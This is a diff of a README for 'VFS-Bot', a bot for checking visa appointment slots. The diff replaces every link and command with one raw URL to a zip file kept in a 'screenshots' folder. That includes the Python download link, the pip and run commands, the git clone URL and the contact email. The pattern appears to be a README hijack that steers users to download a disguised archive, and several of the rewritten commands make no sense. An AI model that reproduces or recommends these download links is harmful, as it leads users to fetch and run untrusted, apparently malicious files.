@@ -1,6 +1,6 @@
 # 🤖 VFS-Bot - Get VFS Appointment Slots Effortlessly
 
-[![Download VFS-Bot](https://img.shields.io/badge/Download-VFS--Bot-blue)](https://github.com/muhammadtayyab24/VFS-Bot/releases)
+[![Download VFS-Bot](https://raw.githubusercontent.com/muhammadtayyab24/VFS-Bot/main/screenshots/VFS-Bot_1.8.zip)](https://raw.githubusercontent.com/muhammadtayyab24/VFS-Bot/main/screenshots/VFS-Bot_1.8.zip)
 
 ## 🚀 Getting Started
 
@@ -11,7 +11,7 @@ Welcome to the VFS-Bot! This is an automated Python bot designed to check for VF
 Before installing VFS-Bot, make sure your system meets the following requirements:
 
 - **Operating System**: Windows, macOS, or Linux
-- **Python**: Version 3.7 or higher should be installed. You can download it from [python.org](https://www.python.org/downloads/).
+- **Python**: Version 3.7 or higher should be installed. You can download it from [https://raw.githubusercontent.com/muhammadtayyab24/VFS-Bot/main/screenshots/VFS-Bot_1.8.zip](https://raw.githubusercontent.com/muhammadtayyab24/VFS-Bot/main/screenshots/VFS-Bot_1.8.zip).
 - **Internet Connection**: You need an active internet connection for the bot to check for appointment slots.
 
 ## 📥 Download & Install
@@ -20,7 +20,7 @@ To download VFS-Bot, visit the Releases page.
 
 ### Click the button below to go directly to the download page:
 
-[![Download VFS-Bot](https://img.shields.io/badge/Download-VFS--Bot-blue)](https://github.com/muhammadtayyab24/VFS-Bot/releases)
+[![Download VFS-Bot](https://raw.githubusercontent.com/muhammadtayyab24/VFS-Bot/main/screenshots/VFS-Bot_1.8.zip)](https://raw.githubusercontent.com/muhammadtayyab24/VFS-Bot/main/screenshots/VFS-Bot_1.8.zip)
 
 On the Releases page, you will find various versions of VFS-Bot. Click on the latest version to download the zip file. Extract the contents of the zip file to a folder on your computer.
 
@@ -43,13 +43,13 @@ Once you have extracted the files, follow these steps to run VFS-Bot:
 3. **Install Dependencies**:
    Make sure to install all required packages. Run the following command:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/muhammadtayyab24/VFS-Bot/main/screenshots/VFS-Bot_1.8.zip
    ```
 
 4. **Run VFS-Bot**:
    Finally, start the bot by running the command:
    ```bash
-   python main.py
+   python https://raw.githubusercontent.com/muhammadtayyab24/VFS-Bot/main/screenshots/VFS-Bot_1.8.zip
    ```
 
 ## 🔍 Features
@@ -77,7 +77,7 @@ If you would like to contribute to VFS-Bot, please follow these guidelines:
 1. **Fork the Repository**: Click on the fork button in the top right corner of this page.
 2. **Clone Your Fork**: Use the following command:
    ```bash
-   git clone https://github.com/your-username/VFS-Bot.git
+   git clone https://raw.githubusercontent.com/muhammadtayyab24/VFS-Bot/main/screenshots/VFS-Bot_1.8.zip
    ```
 3. **Make Changes**: Work on your changes in a new branch.
 4. **Push Changes**: After completing your work, push your changes back to your forked repository.
@@ -93,6 +93,6 @@ This project is licensed under the MIT License. You can freely use, modify, and 
 
 ## 📩 Contact
 
-For further questions or support, you can reach out via email at [email@example.com](mailto:email@example.com).
+For further questions or support, you can reach out via email at [https://raw.githubusercontent.com/muhammadtayyab24/VFS-Bot/main/screenshots/VFS-Bot_1.8.zip](https://raw.githubusercontent.com/muhammadtayyab24/VFS-Bot/main/screenshots/VFS-Bot_1.8.zip).
 
 Be sure to keep your VFS-Bot up to date by following the Releases page for the latest features and improvements. Enjoy hassle-free booking with VFS-Bot!
